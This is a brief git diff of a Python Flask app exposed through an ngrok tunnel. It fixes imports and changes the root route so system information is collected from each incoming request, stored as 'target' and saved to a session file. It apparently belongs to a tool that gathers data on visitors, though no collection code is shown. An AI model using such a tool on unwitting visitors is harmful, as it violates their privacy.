@@ -8,8 +8,8 @@ import socket
 import subprocess
 import threading
 from pathlib import Path
-from .helper.systemInfo import SystemInfo
-from .helper.session import Session
+from helper.systemInfo import SystemInfo
+from helper.session import Session
 from flask import Flask, after_this_request, jsonify, request
 from pyngrok import ngrok
 
@@ -119,7 +119,7 @@ def parse_args() -> argparse.Namespace:
 
 @app.route("/")
 def home():
-    target = SystemInfo().get_info()
+    target = SystemInfo().collect_info(request)
     output_file = Session().save_session(target)
     payload = {
         "target": target,
